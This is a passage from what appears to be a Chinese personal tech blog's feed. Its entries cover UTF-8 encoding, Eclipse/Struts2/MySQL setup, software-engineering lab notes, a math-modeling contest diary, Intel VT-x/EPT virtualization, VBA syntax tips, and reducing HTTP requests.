89，这就是其UTF8的编码。</p><p>而当你新建一个文本文件时，记事本的编码默认是ANSI, 如果你在ANSI的编码输入汉字，那么他实际就是GB系列的编码方式，在这种编码下，&quot;联通&quot;的内码是：</p><p>c1 1100 0001</p><p>aa 1010 1010</p><p>cd 1100 1101</p><p>a8 1010 1000</p><p>注意到了吗？第一二个字节、第三四个字节的起始部分的都是&quot;110&quot;和&quot;10&quot;，正好与UTF8规则里的两字节模板是一致的，于是再次打开记事本时，记事本就误认为这是一个UTF8编码的文件，让我们把第一个字节的110和第二个字节的10去掉，我们就得到了&quot;00001 101010&quot;，再把各位对齐，补上前导的0，就得到了&quot;0000 0000 0110 1010&quot;，不好意思，这是UNICODE的006A，也就是小写的字母&quot;j&quot;，而之后的两字节用UTF8解码之后是0368，这个字符什么也不是。这就是只有&quot;联通&quot;</p><p>两个字的文件没有办法在记事本里正常显示的原因。</p><p>而如果你在&quot;联通&quot;之后多输入几个字，其他的字的编码不见得又恰好是110和10开始的字节，这样再次打开时，记事本就不会坚持这是一个utf8编码的文件，而会用ANSI的方式解读之，这时乱码又不出现了。</p><p>好了，终于可以回答NICO的问题了，在数据库里，有n前缀的字串类型就是UNICODE类型，这种类型中，固定用两个字节来表示一个字符，无论这个字符是汉字还是英文字母，或是别的什么。</p><p>如果你要测试&quot;abc汉字&quot;这个串的长度，在没有n前缀的数据类型里，这个字串是7个字符的长度，因为一个汉字相当于两个字符。而在有n前缀的数据类型里，同样的测试串长度的函数将会告诉你是5个字符，因为一个汉字就是一个字符。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/97858b96/">http://home.meng.uno/articles/97858b96/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      很久很久以前，有一群人，他们决定用8个可以开合的晶体管来组合成不同的状态，以表示世界上的万物。他们看到8个开关状态是好的，于是他们把这称为&quot;字节&quot;。

再后来，他们又做了一些可以处理这些字节的机器，机器开动了，可以用字节来组合出很多状态，状态开始变来变去。他们看到这样是好的，于是它们就这机器称为&quot;计算机&quot;。

开始计算机只在美国用。八位的字节一共可以组合出256(2的8次方)种不同的状态。

他们把其中的编号从0开始的32种状态分别规定了特殊的用途，一但终端、打印机遇上约定好的这些字节被传过来时，就要做一些约定的动作。遇上00x10, 终端就换行，遇上0x07, 终端就向人们嘟嘟叫，例好遇上0
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="UTF-8" scheme="http://home.meng.uno/tags/UTF-8/"/>
    
      <category term="Unicode" scheme="http://home.meng.uno/tags/Unicode/"/>
    
  </entry>
  
  <entry>
    <title>我的Java+Struts2+MySQL配置</title>
    <link href="http://home.meng.uno/articles/61cdd944/"/>
    <id>http://home.meng.uno/articles/61cdd944/</id>
    <published>2016-10-07T11:18:54.000Z</published>
    <updated>2020-12-02T02:02:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="在eclipse中配置struts2">在Eclipse中配置Struts2</h2><p>为了配置Struts2，首先我明确了，配置其所需要的各个部分的文件，我的理解是，一个web.xml(配置监听器)、一个struts.xml(配置“action”)、导入必要的jar包，现将配置好的文件结构截图展示如下：</p><p><img src="/images/profile/1.png" alt="" title="1.png"></p><p>其中，web.xml与struts.xml具体内容将在以后篇幅具体展开！</p><h2 id="在eclipse中配置mysql">在Eclipse中配置MySQL</h2><p>通过对该实验的理解，我发现eclipse配置数据库，并不是针对某一个项目，而是针对整个集成开发环境，所以，相应地配置MySQL也是整个IDE的事，在软件的总配置中，如下图所示位置：</p><p><img src="/images/profile/6.png" alt="" title="6.png"></p><p>此为我成功地加入了MySQL之后的界面，如果没有加入，需要点击右侧的“Add…”进行添加，如下图：</p><p><img src="/images/profile/7.png" alt="" title="7.png"></p><p>由于我添加的是最新的MySQL 5.1，所以在具体的项目中，我也需要导入相应版本的jar包，用来加载MySQL驱动：</p><p><img src="/images/profile/5.png" alt="" title="5.png"></p><p>添加的具体方法是将本地的此jar文件拖动到“WebContent-&gt;WEB-INF-&gt;lib”文件夹下，然后右键，将其添加到“Build Path”。</p><h2 id="在eclipse中配置tomcat">在Eclipse中配置Tomcat</h2><p>Tomcat是一个开源的web应用服务器，与MySQL一样，它也是对整个集成开发环境而言的，所以关于其的配置，也在eclipse的设置中，已经配置好的环境如下：</p><p><img src="/images/profile/2.png" alt="" title="2.png"></p><p>如果是第一次配置，仍然需要点击右侧的“Add…”来选择你要安装的版本：</p><p><img src="/images/profile/3.png" alt="" title="3.png"></p><p>再下一步就是要选择安装的tomcat的地址与安装名称了：</p><p><img src="/images/profile/4.png" alt="" title="4.png"></p><p>点击结束，就会自动安装好，每次对着web项目点击右键，在“Run As”选项下，第一个，就是：Run On Server，即在tomcat上运行该程序。</p><p>至此，开发环境已经完全搭建好了，接下来就是实际的开发过程了!</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/61cdd944/">http://home.meng.uno/articles/61cdd944/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      在Eclipse中配置Struts2
为了配置Struts2，首先我明确了，配置其所需要的各个部分的文件，我的理解是，一个web.xml(配置监听器)、一个struts.xml(配置“action”)、导入必要的jar包，现将配置好的文件结构截图展示如下：



其中，web.xml与struts.xml具体内容将在以后篇幅具体展开！

在Eclipse中配置MySQL
通过对该实验的理解，我发现eclipse配置数据库，并不是针对某一个项目，而是针对整个集成开发环境，所以，相应地配置MySQL也是整个IDE的事，在软件的总配置中，如下图所示位置：



此为我成功地加入了MySQL之后的界面
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="Eclipse" scheme="http://home.meng.uno/tags/Eclipse/"/>
    
      <category term="配置" scheme="http://home.meng.uno/tags/%E9%85%8D%E7%BD%AE/"/>
    
      <category term="MySQL" scheme="http://home.meng.uno/tags/MySQL/"/>
    
      <category term="Struts2" scheme="http://home.meng.uno/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>软工实验二回顾</title>
    <link href="http://home.meng.uno/articles/5353b854/"/>
    <id>http://home.meng.uno/articles/5353b854/</id>
    <published>2016-10-06T12:42:57.000Z</published>
    <updated>2020-12-02T01:52:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>到现在为止，实验二基本上接近尾声了，今天发现了好几个特别坑的地方，现在乘着兴致，我将其总结如下：</p><h2 id="sae的坑">SAE的坑</h2><p>首先，我想发表一下关于我们《软件工程》课所要用的SaaS平台——SAE的唾弃：</p><ul>  <li>特别贵</li>  <li>特别不人性</li>  <li>错误特别多</li>  <li>……</li></ul><h2 id="怎么应对sae的坑">怎么应对SAE的坑</h2><h3 id="关于数据库的选择">关于数据库的选择</h3><p>我之前用的是“共享型”的，后来一直不成功，怎么都连不上（还不报错）！于是，我换成“独享型”还是没什么改变！！！在再三排查之后，发现原来是一个比较简单的又比较不注意的地方，而且网上还没有相关教程！！！ 原来，  <strong>我们本地的MySQL是不区分大小写的，而SAE上的MySQL大小写敏感！！</strong></p><h3 id="连上数据库之后">连上数据库之后</h3><p>在刚才的惊喜之后，又有了另一个问题，就是：原来SAE上传之后需要<strong>相对路径</strong>，不能使用我原来使用的<strong>绝对路径</strong>！</p><h2 id="关于中文">关于中文</h2><p>基本上在编写每一个页面时都会遇到关于中文的问题。</p><h3 id="数据库插入中文">数据库插入中文</h3><p>如果没有声明，默认情况下好像MySQL不是utf-8的编码，所以我将MySQL数据库地址后加入<code>?useUnicode=true&amp;characterEncoding=utf8</code>，就解决了这个问题。</p><h3 id="网页传输遇到中文">网页传输遇到中文</h3><p>我将一个页面的中文传递到另一个页面，发现在另一个页面接收时，其为空或者乱码，很乱的那种！后来，经过查询，我将“s”添加上，例如<code>&lt;s:from&gt;……</code></p><p>暂时只想到这么多啦！！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/5353b854/">http://home.meng.uno/articles/5353b854/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      到现在为止，实验二基本上接近尾声了，今天发现了好几个特别坑的地方，现在乘着兴致，我将其总结如下：

SAE的坑
首先，我想发表一下关于我们《软件工程》课所要用的SaaS平台——SAE的唾弃：

 * 特别贵
 * 特别不人性
 * 错误特别多
 * ……

怎么应对SAE的坑
关于数据库的选择
我之前用的是“共享型”的，后来一直不成功，怎么都连不上（还不报错）！于是，我换成“独享型”还是没什么改变！！！在再三排查之后，发现原来是一个比较简单的又比较不注意的地方，而且网上还没有相关教程！！！ 原来， 我们本地的MySQL是不区分大小写的，而SAE上的MySQL大小写敏感！！

连上数据库之后
在
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="软件工程" scheme="http://home.meng.uno/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>软工实验一要点回顾</title>
    <link href="http://home.meng.uno/articles/9ba24af6/"/>
    <id>http://home.meng.uno/articles/9ba24af6/</id>
    <published>2016-09-28T10:57:29.000Z</published>
    <updated>2020-12-02T01:43:03.000Z</updated>
    
    <content type="html"><![CDATA[<p>距离实验一结束已经有一段时间了，之所以选择在现在这个时候写这篇回顾，是想考验一下，是否真的像老师说的那样： “变量名没有特殊意义的话，过段时间就看不懂了！” 虽然没有到那种程度，但是确实：养成一个好的起变量名的习惯，是非常非常重要的！ 这一次再看以前的代码，觉得有几点比较好的地方：</p><h2 id="方法较清晰">方法较清晰</h2><p>我们组在一开始规划的时候，就将这次实验“藐视”了，以至于我们只能使用一开始想好的强大的数据结构：数组！！！ 我们几乎把每种数组都用了一遍，也算是锻炼我们Java结构化编程基础了吧！我们</p><ul>  <li>用String数组存放以“+/-”分割下来的多项式的每一项；</li>  <li>用Int数组存放每一项的符号；</li>  <li>用Char数组存放原始的输入串的每一个字符——以删掉多余的空格……</li></ul><p>总之，Java基本的元素，我们淋漓尽致地用上了！！</p><h2 id="安排较合理">安排较合理</h2><p>我们没有将这次实验当做什么大的项目来做，反而是想“投机取巧”。 怎么个巧呢？待我一点点招来：</p><ul>  <li>首先，我们在基本功能保障的情况下，写好了化简以及简化、求导等主要功能；</li>  <li>然后，当我想要添加功能时，我觉得我可以不用改动已经写好的功能，而仅仅将输入做处理，做成我们需要的样子！！ 是不是很机智！  </li></ul><p>于是，在我们后来的拓展中，我们仅仅以一个for循环就实现一个功能的神速，比较简单地完成了这次实验。</p><h2 id="后记">后记</h2><p>这是我使用Java写的第一个项目，有很多东西没法用的那么熟练，例如：每次分割字符串，我们都是用“substring+for循环”来实现。 后来，我终于发现我为什么没法用  <strong>split</strong>了，原来在使用它的时候，参数如果是符号，就要加“\”，对，是两个“\”，这样才行。 也算是通过实验掌握的一个Java小知识吧！！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/9ba24af6/">http://home.meng.uno/articles/9ba24af6/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      距离实验一结束已经有一段时间了，之所以选择在现在这个时候写这篇回顾，是想考验一下，是否真的像老师说的那样： “变量名没有特殊意义的话，过段时间就看不懂了！” 虽然没有到那种程度，但是确实：养成一个好的起变量名的习惯，是非常非常重要的！ 这一次再看以前的代码，觉得有几点比较好的地方：

方法较清晰
我们组在一开始规划的时候，就将这次实验“藐视”了，以至于我们只能使用一开始想好的强大的数据结构：数组！！！ 我们几乎把每种数组都用了一遍，也算是锻炼我们Java结构化编程基础了吧！我们

 * 用String数组存放以“+/-”分割下来的多项式的每一项；
 * 用Int数组存放每一项的符号；
 * 用
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="软件工程" scheme="http://home.meng.uno/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>一次数学建模经历</title>
    <link href="http://home.meng.uno/articles/832e4a48/"/>
    <id>http://home.meng.uno/articles/832e4a48/</id>
    <published>2016-09-12T04:25:49.000Z</published>
    <updated>2020-12-02T01:44:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>经过三个白天，一个黑夜的战斗，我们终于如期赶出我们的数学建模论文。我将链接附加于此，希望大家帮忙指正。版权所有，请勿抄袭。  <a href="https://mega.nz/#!PMliSAbb!6hoWFHJEI3W3M0Exn6edmbhhl2CGdZa7XRom-KjktVI" target="_blank" rel="noopener">https://mega.nz/#!PMliSAbb!6hoWFHJEI3W3M0Exn6edmbhhl2CGdZa7XRom-KjktVI</a></p><blockquote>  <p>结果：省一</p></blockquote><p><strong><em>三天日记</em></strong></p><h2 id="第一天">第一天</h2><p>看看现在的时间，竞赛第一天就这么过去了。然而到现在为止，我们什么都没做！！</p><h3 id="为什么会这样？">为什么会这样？</h3><p>我觉得，最主要的原因，应该是我们组自己的问题——从来没有实际模拟过！就在开赛的前几天，我们还在为平时的课而发愁。</p><p>还有就是，我们的选题，虽然我学过一年的交通，但是在这道题上，我还是显得手足无措，丝毫没有思路，当初我们之所以选这道题是因为我们觉得第一题可能不太适合我们非数学系的人做，这么看来，第二题不适合 我们非工程学生做啊233。</p><h3 id="我的想法">我的想法</h3><p>虽然有这么多的困难，但是我觉得我还是很有信心的，毕竟这次竞赛意义非比寻常！ 虽然有那么多的不适合，但是还是有很努力的小伙伴们一起！</p><h3 id="立个flag">立个Flag</h3><p>我们一定做好这次建模！</p><h2 id="第二天">第二天</h2><p>我们或许还是太年轻，太没有经验，昨天大好时光居然就那么浪费了，谁知道今天依旧没有什么头绪。还</p><p>有10分钟就明天了，可是到现在我们连一个模型都没建好，连第一题都没有写出来。虽说第一次，失败了也没有关系，但是如果还有时间可以努力，但是已经宣布你失败了，谁会甘心！</p><p>我们从早上8点到正心去合作讨论，一直到刚才不久，才回到寝楼的自习室，继续我们的”创举“，只能用充实来形容这一天天的生活。</p><p>不过，大学生嘛，总得在大学期间有所追求，有所疯狂，眼看着已经大三，这应该是我们这组人唯一一次参加的数学建模了。时间不多也不少，还有一半！</p><p>看着对面的两个队友都在认真地查阅着文献，而我却在这写博客，着实有点不好意思，不过还好，马上就结束了，希望我能在接下来的一半时间里，认真投入，也预祝我们对在这次比赛中取得好成绩！</p><h2 id="第三天">第三天</h2><p>本来昨天才应该是第三天，可是我觉得加上这11个小时，第三天才算完整！</p><p>说实话，前两天我们真的没做出什么像样的东西来，连第二题都没有写完，连模型都没有建起来，但是最后一天往往就是转机！</p><p>第三天如往常一样来临，这一次我们起的一个比一个晚，总是听到周围同学不想做了的豪情壮语，我们也有点想要放弃了呢。</p><p>但我们没一个人敢先提“放弃”，就这样我们仅仅抱着想把这次竞赛打完的想法，一点点凑着我们丝毫没有连贯性的论文。</p><p>夜，很快就来了，我们都感到疲倦。</p><p>最终只有我和赵正宇坚持熬夜来做，我们避开楼管大叔，来到正心楼8楼，准确地说是822教室，教室里随处可见考研教材和英语资料。</p><p>我们选了最后一排，继续我们的创作，本来丝毫没有连贯性的一篇一万多字的“杂文”，居然在我们不到三个小时的时间里将它完全驯服妥帖。</p><p>我们本来都在暗自高兴，也就聊到了其他的一些事情，可能没有这次竞赛，不会和这位老乡这么亲切，也不会体验到真正的努力是什么滋味！ 乘着兴致，我很快又做完了平时需要几个小时才能完成的评优评奖答辩PPT。</p><p>这是天已经亮了，哈尔滨远没有家乡那么热闹，一切都还在睡梦中。</p><p>我们迫不及待地一遍遍保存、转换格式、阅读……确保没有什么错误了，我们又急切地准备提交了。这一切简直不敢相信，只能说太佩服自己了！ 今天早晨，吃了这学期第一次早餐，最饱的一次早餐……</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/832e4a48/">http://home.meng.uno/articles/832e4a48/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      经过三个白天，一个黑夜的战斗，我们终于如期赶出我们的数学建模论文。我将链接附加于此，希望大家帮忙指正。版权所有，请勿抄袭。 https://mega.nz/#!PMliSAbb!6hoWFHJEI3W3M0Exn6edmbhhl2CGdZa7XRom-KjktVI

结果：省一

三天日记

第一天
看看现在的时间，竞赛第一天就这么过去了。然而到现在为止，我们什么都没做！！

为什么会这样？
我觉得，最主要的原因，应该是我们组自己的问题——从来没有实际模拟过！就在开赛的前几天，我们还在为平时的课而发愁。

还有就是，我们的选题，虽然我学过一年的交通，但是在这道题上，我还是显得手足无措，丝毫没有
    
    </summary>
    
      <category term="Note" scheme="http://home.meng.uno/categories/Note/"/>
    
    
      <category term="数学建模" scheme="http://home.meng.uno/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
    
  </entry>
  
  <entry>
    <title>VT-x/EPT解读</title>
    <link href="http://home.meng.uno/articles/18c2ca64/"/>
    <id>http://home.meng.uno/articles/18c2ca64/</id>
    <published>2016-09-10T04:07:20.000Z</published>
    <updated>2020-12-02T02:10:14.000Z</updated>
    
    <content type="html"><![CDATA[<h1>1 VT-x</h1><p>VT-x是intel针对硬件辅助虚拟化的技术，它解决x86指令集不能被虚拟化的问题，并且简化了VMM软件，减少了软件虚拟化的需求。Virtual Machine Extensions定义了一系列新的操作，称为VMX操作，来提供处理器级别的支持。同时它提供了一个新的特权等级VMX root给VMM，从而避免了ring deprivileging方法(让操作系统运行于ring 1，VMM使用ring 0)带来的虚拟化漏洞。VMX操作可以分为两类：</p><ul>  <li>root:VMM执行的VMX root 操作</li>  <li>non-root:Guest执行的VMX non-root操作</li></ul><p>对于这两种模式之间的转换，VMX提供了确切的说法：</p><ul>  <li>VM Entry:转换到VMX non-root操作</li>  <li>VM Exit:从VMX non-root操作转换到VMX root操作</li></ul><p>实际上，这个操作过程也就是VMM和虚拟机之间的转换过程。VMCS是一个用来管理VMX non-root操作和VMX转换的数据结构。它由VMM配置，指定guest OS状态，并在VM exits发生时进行控制。</p><p><img src="http://www.meng.uno/images/VT-x/VMCS.png" alt="VMCS"></p><h1>2 MMU虚拟化</h1><p>第一代VT-x在每次VMX转换都会进行TLB冲洗，这会造成在所有VM exits和大部分VM entries时的性能流失，因此对TLB清洗必须有更好的VMM软件控制。VPID(virtual Processor Identifier)是VMCS中的一个16bit域，它用来缓存线性翻译的结果。VPID启动时，就不需要冲洗TLB，不同虚拟机的TLB项能在TLB中共存。</p><p>既往的VMM维持一个shadow page table，将guest的virtual pages，直接映射到machine pages。同时，guest中的V-&gt;P表，与VMM中V-&gt;M shadow page table同步。为了维持guest page table和shadow page table之间的关系，会因为VMM traps造成额外的代价，每次切换都会丢失性能，并且为了复制guest page table，在内存上也会有额外花费。</p><h1>3 EPT(Extended Page Table)</h1><p>EPT这样的硬件支持(在AMD架构中类似的技术是NPT，nested page table)能够有效解决传统shadow page table的花销问题。在KVM最新的内存虚拟化技术中，采用了两级页表映射。第一级页表，客户虚拟机采用的是传统操作系统的页表，也即guest page table，记录着客户机虚拟地址(GVA)到客户机物理地址(GPA)的映射。而在KVM中，维护的第二级页表是extended page table(EPT)，记录的是虚拟机物理地址(GPA)到宿主机物理地址(HPA)的映射。</p><p><img src="http://www.meng.uno/images/VT-x/EPT.png" alt="TDP"></p><p>在图中可以看到，包括guest CR3在内，一共有5个GPA，它们都要通过硬件走一次EPT，得到下一个HPA。那么如何通过EPT计算出对应的HPA呢，KVM是如何操作的呢？EPT和传统的页表一样，也分为4层(PML4、PDPT、PD、PT)，一个gpa通过四级页表的寻址，再加上gpa最后12位的offset，得到了hpa。</p><p>在这个架构中，页可以分为两种：物理页(physical page)和页表页(MMU page)。物理页就是真正存放数据的页，页表页是存放EPT页表的页。这两种页创建的方式也不同，物理页可以通过内核提供的__get_free_page来创建，而页表页则是通过mmu_page_cache获得。这个page cache是在KVM初始化vcpu时通过linux内核中的slab机制分配的，它作为之后的MMU pages的cache来使用。在KVM中，每个MMU page对应一个数据结构kvm_mmu_page，在EPT处理过程中，它是极为重要的一个数据结构。</p><p>一条地址如何翻译？首先non-root状态下的CPU加载guest CR3，由于guest CR3是一条GPA，CPU需要通过EPT来实现GPA-&gt;HPA的转换。但首先，MMU会先查询硬件的TLB，来判断有没有GPA到HPA的映射。如果没有GPA到HPA的映射，那么在cache中查询EPT/NPT。如果cache里面没有缓存，则逐层向下层存储查询，最终获得guest CR3所映射的物理地址单元内容，作为下一级guest页表的索引基址。当CPU访问EPT页表，查找HPA，发现相应的页表项不存在时，就会抛出EPT  Violation，由VMM截获处理它。随后通过GVA的偏移量，计算出下一条GPA，依次循环下去，直到最终获得客户机请求的页。整个过程如下图所示。</p><p><img src="http://www.meng.uno/images/VT-x/violate.png" alt="violate"></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/18c2ca64/">http://home.meng.uno/articles/18c2ca64/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      1 VT-x
VT-x是intel针对硬件辅助虚拟化的技术，它解决x86指令集不能被虚拟化的问题，并且简化了VMM软件，减少了软件虚拟化的需求。Virtual Machine Extensions定义了一系列新的操作，称为VMX操作，来提供处理器级别的支持。同时它提供了一个新的特权等级VMX root给VMM，从而避免了ring deprivileging方法(让操作系统运行于ring 1，VMM使用ring 0)带来的虚拟化漏洞。VMX操作可以分为两类：

 * root:VMM执行的VMX root 操作
 * non-root:Guest执行的VMX non-root操作

对于这两种模
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Intel" scheme="http://home.meng.uno/tags/Intel/"/>
    
      <category term="虚拟化" scheme="http://home.meng.uno/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
      <category term="VT-x" scheme="http://home.meng.uno/tags/VT-x/"/>
    
      <category term="EPT" scheme="http://home.meng.uno/tags/EPT/"/>
    
  </entry>
  
  <entry>
    <title>VBA常用语法</title>
    <link href="http://home.meng.uno/articles/c779c554/"/>
    <id>http://home.meng.uno/articles/c779c554/</id>
    <published>2016-08-29T08:14:52.000Z</published>
    <updated>2020-12-02T02:09:32.000Z</updated>
    
    <content type="html"><![CDATA[<ol>  <li>数组下标是从0开始的</li>  <li>sheet下标是从1开始的</li>  <li>获取<code>dict</code>的方法</li></ol><figure class="highlight vb">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">Dim</span> dic  </span><br><span class="line">setdic = CreateObject(<span class="string">"Scripting.Dictionary"</span>)</span><br></pre>      </td>    </tr>  </table></figure><ol start="4">  <li><code>dict</code>添加数值方法</li></ol><figure class="highlight vb">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">dic.Add <span class="keyword">key</span>, value</span><br></pre>      </td>    </tr>  </table></figure><ol start="5">  <li>遍历<code>dict</code> 方法</li></ol><figure class="highlight vb">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> Data <span class="keyword">In</span> dict</span><br><span class="line">MsgBox (dict.Item(Data) &amp; <span class="string">":"</span> &amp; Data)</span><br><span class="line"><span class="keyword">Next</span></span><br></pre>      </td>    </tr>  </table></figure><ol start="6">  <li>vba用 <code>'&amp;'</code>来连接字符串</li></ol><a id="more"></a><ol start="7">  <li>正则表达式使用方法</li></ol><figure class="highlight vb">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">Dim</span> regEx</span><br><span class="line"><span class="keyword">Set</span> regEx = CreateObject(<span class="string">"vbscript.regexp"</span>)</span><br><span class="line">regEx.<span class="keyword">Global</span> = <span class="literal">True</span></span><br><span class="line">regEx.Pattern = <span class="string">".?[0-9A-F]+$"</span></span><br><span class="line">result = regEx.test(content) <span class="comment">'验证content</span></span><br></pre>      </td>    </tr>  </table></figure><ol start="8">  <li>获取某张数据表(sheet)已经使用的行列数方法</li></ol><figure class="highlight vb">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">Dim</span> rows, columns  </span><br><span class="line">rows = sheet.UsedRange.rows.Count  </span><br><span class="line">colums = sheet.UsedRange.Columns.Count</span><br></pre>      </td>    </tr>  </table></figure><ol start="9">  <li>获取某张数据表</li></ol><figure class="highlight vb">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Sheets(i)<span class="comment">'根据id获取表  </span></span><br><span class="line">Sheets(<span class="string">"map"</span>)<span class="comment">'根据名称获取表</span></span><br><span class="line">Sheets(i).name<span class="comment">'获取表的名称</span></span><br></pre>      </td>    </tr>  </table></figure><ol start="10">  <li>获得数据表的某行内容</li></ol><figure class="highlight vb">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">Sheets(i).Cells(c, <span class="number">1</span>)</span><br><span class="line">Sheets(i).Range(<span class="string">"A17"</span>)</span><br></pre>      </td>    </tr>  </table></figure><ol start="11">  <li>UBound获取数组长度(数组最后一位的下标,数组从0开始).1表示有两个数</li>  <li>当函数从中间处理错误要退出可以使用 <code>Exit Function</code>不要用Return，不然返回值会没有</li>  <li>使用 Function关键字能有返回值，返回值应该赋给函数名。</li></ol><p><br><br>本文链接： <a href="http://home.meng.uno/articles/c779c554/">http://home.meng.uno/articles/c779c554/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      1. 数组下标是从0开始的
 2. sheet下标是从1开始的
 3. 获取dict的方法

1
2


Dim dic  
setdic = CreateObject(&quot;Scripting.Dictionary&quot;)


 4. dict添加数值方法

1


dic.Add key, value


 5. 遍历dict 方法

1
2
3


For Each Data In dict
	MsgBox (dict.Item(Data) &amp; &quot;:&quot; &amp; Data)
Next


 6. vba用 &#39;&amp;&#39;来连接字符串

 7. 正则表达式使用方法

1
2
3
4
5


Dim regEx

    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="VBA" scheme="http://home.meng.uno/tags/VBA/"/>
    
  </entry>
  
  <entry>
    <title>减少HTTP请求</title>
    <link href="http://home.meng.uno/articles/a7561c66/"/>
    <id>http://home.meng.uno/articles/a7561c66/</id>
    <published>2016-08-14T05:10:00.000Z</published>
    <updated>2020-12-02T02:03:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1>前言</h1><p>关于web性能，有两个著名论断：</p><ol>  <li><strong>0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力</strong>——Robert Miller</li>  <li><strong>用户所接受的数据，有80~90%的时间都耗在前端上</strong>——Steve Souders</li></ol><p>前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精…</p><p>后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载，怎样加载，都是前端工程师可以控制的。</p><h1>再议减少HTTP请求</h1><p>“尽量减少HTTP请求，减少DNS查找”这是Yslow写在最前面的两条规则。而放之实际，可能会遇到挑战。为何？因为我们完成了“降低请求数”的目标，但可能损失了其他方面的指标。</p><p><strong>a. 没有浏览器缓存</strong></p><p>减少HTTP请求，很常用的做法就是把js和css资源inline到html里。这样的做法，自然没有浏览器缓存，重复加载时连静态资源也必须加载。也许有人又说，我可以把整个html文件都缓存啊！的确可以，但以web开发的更新速度，html文件一般都不设或设置很短时间（5 min?）缓存。另外在web2.0时代里，html缓存会带来不必要的问题。比如登录前后，页面资源展示不一样，那么我们就得慎用html缓存。</p><p><strong>b. 没有cdn缓存</strong></p><p>这个很好理解，任何的内联资源，由于依赖于html，都必须从源服务器而不是cdn服务器返回。</p><p><strong>c. 不能按需加载</strong></p><p>为了按需加载，前端工程师可谓想法各异，天马行空。比如图片的lazyload技术，异步加载js脚本，而inline的方式恰恰将一切想法摁回脑中。</p><p><strong>d. 浏览器预解析DNS失效</strong></p><p>现代浏览器有预解析DNS技术。简单来说，就是页面下载到浏览器时，先扫描一遍，在这时发现域名并预解析DNS。这样的前置解析跟dom渲染等操作同步执行，诚然会使浏览器更快。但如果你的html页面因为内联了太多内容（base64图片），大于5M时，浏览器的预解析DNS将会失效。</p><h1>最佳实践</h1><p>因而，我们时常像那只捡芝麻丢西瓜的熊。如此平衡这两者呢，业界给我们两个很好的案例。</p><p><strong>Demo1 必应</strong></p><ol>  <li>首次内联CSS与JS</li>  <li>将资源取出，并保存在localStorage中</li>  <li>资源名（版本）保存在cookie中</li>  <li>后续请求中，服务器检查对应的cookie</li>  <li>根据cookie的值，只嵌入新的脚本</li>  <li>加载时，从localStorage里载入资源</li></ol><p><strong>Demo2 百度(移动端)</strong></p><ol>  <li>首次将静态资源打包，用jsonp统一返回</li>  <li>将资源解析并保存在localStorage中</li>  <li>再次访问时检查localStorage中资源情况</li>  <li>如有缺失再发请求获取资源</li></ol><p>必应的做法确保了首次的http请求最少，后续充分发挥增量更新（当然粒度还是文件）的优势提高性能，但缺点是cookie并不可靠。百度则是把首次静态资源的http请求降低到一次，非常暴力的把全部css，js打包成字符串，以jsonp返回。宁愿用str转obj的解析时间去换取加载时间。而随V8引擎的强大，这点解析的时间也将越来越不值得提起。总而言之，这两个Demo都把http请求尽可能的降低，而后都利用了本地存储去获得资源。</p><p>我有时候会想起那把由无名的铁匠用三个小时粗制而成的小李飞刀。<br> 